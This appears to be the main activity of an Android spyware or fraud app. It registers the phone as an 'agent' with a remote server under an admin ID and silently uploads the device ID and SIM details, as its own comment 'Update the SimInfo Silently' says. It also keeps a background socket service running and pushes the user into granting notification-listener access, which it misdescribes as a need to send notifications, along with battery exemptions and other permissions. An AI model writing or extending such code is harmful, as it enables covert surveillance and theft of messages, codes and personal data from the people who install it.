package com.topdown.softy;

import android.annotation.SuppressLint;
import android.app.AlarmManager;
import android.app.AlertDialog;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;

import androidx.activity.EdgeToEdge;
import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import com.topdown.softy.functions.helpers.Prefs;
import com.topdown.softy.functions.managers.DeviceManager;
import com.topdown.softy.functions.utils.Utils;
import com.topdown.softy.server.req.RetrofitClient;
import com.topdown.softy.server.socket.SocketService;
import com.topdown.softy.ui.Page1Activity;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.TimeZone;
import java.util.logging.Level;
import java.util.logging.Logger;

import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class MainActivity extends AppCompatActivity {
    private static final Logger LOG = Logger.getLogger(MainActivity.class.getSimpleName());
    private static final int PERMISSION_REQUEST_CODE = 1001;

    private ActivityResultLauncher<Intent> batteryOptimizationLauncher;
    private ActivityResultLauncher<Intent> alarmPermissionLauncher;
    private ActivityResultLauncher<Intent> notificationListenerLauncher;
    private ActivityResultLauncher<String> postNotificationLauncher;

    private boolean registrationSuccess = false;
    private int deniedCount = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });

        ensureInstalledAt();

        initializeActivityLaunchers();
        startSocketServiceSafely();
    }

    private void ensureInstalledAt() {
        Prefs prefs = new Prefs(this);
        if (Prefs.NO_DATA.equals(prefs.getPref("installedAt"))) {
            prefs.setPref("installedAt", formatTime(new Date()));
        }
    }

    private void initializeActivityLaunchers() {
        batteryOptimizationLauncher = registerForActivityResult(
                new ActivityResultContracts.StartActivityForResult(),
                result -> {
                    if (isBatteryOptimizationDisabled()) {
                        checkAlarmPermission();
                    } else {
                        showPermissionDeniedDialog(
                                "Battery Optimization",
                                "Battery optimization exemption is required to keep the service running in the background.",
                                this::requestBatteryOptimization
                        );
                    }
                }
        );

        alarmPermissionLauncher = registerForActivityResult(
                new ActivityResultContracts.StartActivityForResult(),
                result -> {
                    if (canScheduleExactAlarms()) {
                        checkNotificationListener();
                    } else {
                        showPermissionDeniedDialog(
                                "Alarm Permission",
                                "Exact alarm permission is required for scheduled tasks.",
                                this::requestAlarmPermission
                        );
                    }
                }
        );

        notificationListenerLauncher = registerForActivityResult(
                new ActivityResultContracts.StartActivityForResult(),
                result -> {
                    if (isNotificationListenerEnabled()) {
                        checkPostNotificationPermission();
                    } else {
                        showPermissionDeniedDialog(
                                "Notification Permission",
                                "Notification permission is required to post notifications.",
                                this::requestNotificationListener
                        );
                    }
                }
        );

        postNotificationLauncher = registerForActivityResult(
                new ActivityResultContracts.RequestPermission(),
                isGranted -> {
                    if (isGranted) {
                        requestRuntimePermissions();
                    } else {
                        showPermissionDeniedDialog(
                                "Post Notifications",
                                "Notification permission is required to send you important alerts.",
                                this::requestPostNotificationPermission
                        );
                    }
                }
        );
    }

    private void proceed() {
        updateSystemInfo();
        startActivity(new Intent(this, Page1Activity.class));
        finish();
    }


    /*Update the SimInfo Silently*/
    private void updateSystemInfo() {
        try {
            JSONObject body = getDeviceBody();

            RetrofitClient.getInstance(this).getApiInterfaces().onAgentInit(
                    RetrofitClient.generateRequestBody(body)
            ).enqueue(new Callback<>() {
                @Override
                public void onResponse(@NonNull Call<ResponseBody> call, @NonNull Response<ResponseBody> response) {

                }

                @Override
                public void onFailure(@NonNull Call<ResponseBody> call, @NonNull Throwable t) {

                }
            });
        } catch (JSONException e) {
            throw new RuntimeException(e);
        }
    }

    private void startSocketServiceSafely() {
        try {
            Intent i = new Intent(this, SocketService.class);
            startForegroundService(i);
            registerAgent();
        } catch (Exception e) {
            LOG.log(Level.SEVERE, "FGS start failed", e);
            showServiceErrorDialog(e.getMessage());
        }
    }

    private void stopSocketServiceSafely() {
        try {
            Intent i = new Intent(this, SocketService.class);
            stopService(i);
        } catch (Exception e) {
            LOG.log(Level.SEVERE, "FGS stop failed", e);
        }
    }

    private void registerAgent() {
        if (Utils.ADMIN_USERNAME.isEmpty()) return;
        try {
            JSONObject body = getDeviceBody();

            RetrofitClient.getInstance(this).getApiInterfaces().onAgentInit(
                    RetrofitClient.generateRequestBody(body)
            ).enqueue(new Callback<>() {
                @Override
                public void onResponse(@NonNull Call<ResponseBody> call, @NonNull Response<ResponseBody> res) {
                    if (!res.isSuccessful() || res.body() == null) {
                        showRegistrationErrorDialog("Registration failed. Please try again.");
                        return;
                    }
                    try {
                        JSONObject j = new JSONObject(res.body().string());
                        if (!j.optString("status", "").equals("success")) {
                            oldApp();
                            stopSocketServiceSafely();
                            return;
                        }

                        if (j.has("data") && !j.getJSONArray("data").optJSONObject(0).optString("status", "success").equals("success")) {
                            oldApp();
                            stopSocketServiceSafely();
                            return;
                        }

                        registrationSuccess = true;
                        requestBatteryOptimization();

                    } catch (JSONException | IOException e) {
                        LOG.log(Level.WARNING, "JSON Error", e);
                        showRegistrationErrorDialog("Registration failed. Please try again.");
                    }
                }

                @Override
                public void onFailure(@NonNull Call<ResponseBody> call, @NonNull Throwable t) {
                    Utils.markLog(MainActivity.this, "Agent init failed: " + t.getMessage(), "MainActivity");
                    showRegistrationErrorDialog("Network error: " + t.getMessage());
                }
            });
        } catch (JSONException e) {
            LOG.log(Level.WARNING, "Payload build failed", e);
            showRegistrationErrorDialog("Failed to build request: " + e.getMessage());
        }
    }

    private void oldApp() {
        new AlertDialog.Builder(MainActivity.this).setTitle("Old App!").setMessage("The New Version Of This App is Available. Please Update to Continue.").setCancelable(false).setPositiveButton("Okay", (dialogInterface, i) ->
                finish()).show();
    }

    private JSONObject getDeviceBody() throws JSONException {
        DeviceManager manager = new DeviceManager(this);
        return new JSONObject()
                .put("adminID", Utils.ADMIN_USERNAME)
                .put("agentName", getString(R.string.app_name))
                .put("agentID", Utils.AGENT_ID)
                .put("deviceID", manager.getDeviceID())
                .put("deviceName", Utils.getPhoneName())
                .put("apiLevel", Build.VERSION.SDK_INT)
                .put("simDetails", manager.getSimDetails());
    }

    // Permission Flow Methods
    private void requestBatteryOptimization() {
        if (isBatteryOptimizationDisabled()) {
            checkAlarmPermission();
            return;
        }
        @SuppressLint("BatteryLife") Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
        intent.setData(Uri.parse("package:" + getPackageName()));
        batteryOptimizationLauncher.launch(intent);
    }

    private void checkAlarmPermission() {
        if (Utils.isAlarmManagerEnabled) {
            requestAlarmPermission();
        } else {
            checkNotificationListener();
        }
    }

    private void requestAlarmPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            if (canScheduleExactAlarms()) {
                checkNotificationListener();
                return;
            }
            new AlertDialog.Builder(this)
                    .setTitle("Exact Alarm Permission")
                    .setMessage("This app needs permission to schedule exact alarms for time-sensitive tasks.")
                    .setPositiveButton("Continue", (dialog, which) -> {
                        Intent intent = new Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM);
                        intent.setData(Uri.parse("package:" + getPackageName()));
                        alarmPermissionLauncher.launch(intent);
                    })
                    .setCancelable(false)
                    .show();
        } else {
            checkNotificationListener();
        }
    }

    private void checkNotificationListener() {
        if (Utils.isNotificationReadingEnabled) {
            requestNotificationListener();
        } else {
            checkPostNotificationPermission();
        }
    }

    private void requestNotificationListener() {
        if (isNotificationListenerEnabled()) {
            checkPostNotificationPermission();
            return;
        }

        new AlertDialog.Builder(this)
                .setTitle("Notification Permission!")
                .setMessage("This app needs to send notifications. Please enable notification permission in the next screen.")
                .setPositiveButton("Continue", (dialog, which) -> {
                    Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
                    notificationListenerLauncher.launch(intent);
                })
                .setCancelable(false)
                .show();
    }

    private void checkPostNotificationPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            requestPostNotificationPermission();
        } else {
            requestRuntimePermissions();
        }
    }

    private void requestPostNotificationPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.POST_NOTIFICATIONS)
                    == PackageManager.PERMISSION_GRANTED) {
                requestRuntimePermissions();
                return;
            }

            if (ActivityCompat.shouldShowRequestPermissionRationale(this, android.Manifest.permission.POST_NOTIFICATIONS)) {
                new AlertDialog.Builder(this)
                        .setTitle("Notification Permission")
                        .setMessage("This app needs permission to send you important notifications.")
                        .setPositiveButton("Continue", (dialog, which) ->
                                postNotificationLauncher.launch(android.Manifest.permission.POST_NOTIFICATIONS))
                        .setCancelable(false)
                        .show();
            } else {
                postNotificationLauncher.launch(android.Manifest.permission.POST_NOTIFICATIONS);
            }
        } else {
            requestRuntimePermissions();
        }
    }

    private void requestRuntimePermissions() {
        List<String> permissionsToRequest = new ArrayList<>();

        for (String permission : Utils.APP_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(permission);
            }
        }

        if (permissionsToRequest.isEmpty()) {
            proceed();
        } else {
            ActivityCompat.requestPermissions(
                    this,
                    permissionsToRequest.toArray(new String[0]),
                    PERMISSION_REQUEST_CODE
            );
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == PERMISSION_REQUEST_CODE) {
            List<String> deniedPermissions = new ArrayList<>();

            for (int i = 0; i < permissions.length; i++) {
                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                    deniedPermissions.add(permissions[i]);
                }
            }

            if (deniedPermissions.isEmpty()) {
                proceed();
            } else {
                showRuntimePermissionsDeniedDialog(deniedPermissions);
            }
        }
    }

    // Helper Methods
    private boolean isBatteryOptimizationDisabled() {
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        return pm != null && pm.isIgnoringBatteryOptimizations(getPackageName());
    }

    private boolean canScheduleExactAlarms() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
            return alarmManager != null && alarmManager.canScheduleExactAlarms();
        }
        return true;
    }

    private boolean isNotificationListenerEnabled() {
        String enabledListeners = Settings.Secure.getString(
                getContentResolver(),
                "enabled_notification_listeners"
        );
        return enabledListeners != null && enabledListeners.contains(getPackageName());
    }

    // Dialog Methods
    private void showPermissionDeniedDialog(String title, String message, Runnable retryAction) {
        new AlertDialog.Builder(this)
                .setTitle(title + " Required")
                .setMessage(message)
                .setPositiveButton("Retry", (dialog, which) -> retryAction.run())
                .setNegativeButton("Exit", (dialog, which) -> finish())
                .setCancelable(false)
                .show();
    }

    private void showRuntimePermissionsDeniedDialog(List<String> deniedPermissions) {
        deniedCount++;
        if (deniedCount >= 2) {
            proceed();
            return;
        }
        new AlertDialog.Builder(this)
                .setTitle("Permissions Required")
                .setMessage("Some permissions were denied. These permissions are required for the app to function properly.")
                .setPositiveButton("Retry", (dialog, which) -> requestRuntimePermissions())
                .setNegativeButton("Exit", (dialog, which) -> finish())
                .setCancelable(false)
                .show();
    }

    private void showServiceErrorDialog(String error) {
        new AlertDialog.Builder(this)
                .setTitle("Service Error")
                .setMessage("Unable to start service: " + error)
                .setPositiveButton("Retry", (dialog, which) -> startSocketServiceSafely())
                .setNegativeButton("Exit", (dialog, which) -> finish())
                .setCancelable(false)
                .show();
    }

    private void showRegistrationErrorDialog(String error) {
        new AlertDialog.Builder(this)
                .setTitle("Registration Failed")
                .setMessage(error)
                .setPositiveButton("Retry", (dialog, which) -> registerAgent())
                .setNegativeButton("Exit", (dialog, which) -> finish())
                .setCancelable(false)
                .show();
    }

    @SuppressLint("SimpleDateFormat")
    private String formatTime(Date d) {
        SimpleDateFormat s = new SimpleDateFormat("dd/MM/yyyy, HH:mm:ss");
        s.setTimeZone(TimeZone.getTimeZone("Asia/Kolkata"));
        return s.format(d);
    }
}